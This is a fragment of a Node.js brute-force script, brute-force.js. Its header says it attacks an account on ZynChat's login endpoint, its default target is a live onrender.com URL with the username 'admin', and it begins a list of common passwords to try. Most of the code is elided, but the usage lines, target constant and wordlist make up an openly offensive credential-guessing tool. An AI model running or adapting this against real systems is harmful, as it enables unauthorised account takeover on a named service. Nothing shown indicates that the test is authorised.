 ...
 * ║  account on ZynChat's login endpoint.                       ║
 * ║                                                              ║
 ...
 * Usage:
 *   node brute-force.js
 *   node brute-force.js https://zynchat-kuuz.onrender.com admin
 */

const https = require('https');
const http  = require('http');

const TARGET   = process.argv[2] || 'https://zynchat-kuuz.onrender.com';
...
const PASSWORDS = [
  ...
  'Admin123', 'zynchat', 'nexacorp', 'admin@123', 'P@ssw0rd',
